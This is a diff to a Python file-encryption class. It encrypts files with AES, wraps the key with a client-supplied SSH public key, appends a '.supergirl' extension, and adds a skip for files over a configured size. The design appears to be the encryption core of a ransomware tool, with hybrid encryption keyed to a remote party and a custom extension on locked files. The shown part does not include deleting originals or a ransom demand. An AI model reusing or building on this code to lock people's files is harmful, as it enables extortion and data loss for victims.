@@ -4,10 +4,12 @@ from cryptography.hazmat.backends import default_backend
 from AES.RandomKeyGen import RandomKeyGen
 from Crypto import Random
 from Crypto.Cipher import AES
-import base64, os
+import base64
+import os
+import Config
+
 
 class FileCrypter:
-
     def __init__(self):
         self.key, self.iv = RandomKeyGen().getKey()
         self.encoding = 'utf-8'
@@ -31,6 +33,9 @@ class FileCrypter:
         if not os.path.isfile(file_name):
             return
 
+        file_size = os.path.getsize(file_name) * 0.000000001
+        if file_size > Config.MAX_SIZE_LIMIT:
+            return
 
         public_key = serialization.load_ssh_public_key(
             bytes(client_pub_key, 'utf-8'),
@@ -51,8 +56,11 @@ class FileCrypter:
         )
 
         cipher = base64.b64encode(cipher)
+
+
         with open(file_name, 'rb') as fo:
             plaintext = fo.read()
+
         enc = self.encrypt(plaintext, self.key)
 
         with open(file_name + ".supergirl", 'wb') as fo:
@@ -88,9 +96,9 @@ class FileCrypter:
         aes_iv_clear = aes_iv_clear.decode(self.encoding)
         aes_iv_clear = aes_iv_clear.split(';')[0]
         aes_iv_clear = base64.b64decode(aes_iv_clear)
+
         with open(file_name, 'rb') as fo:
             ciphertext = fo.read()
-
         dec = self.decrypt(ciphertext, aes_iv_clear)
         with open(file_name[:-10], 'wb') as fo:
             fo.write(dec)
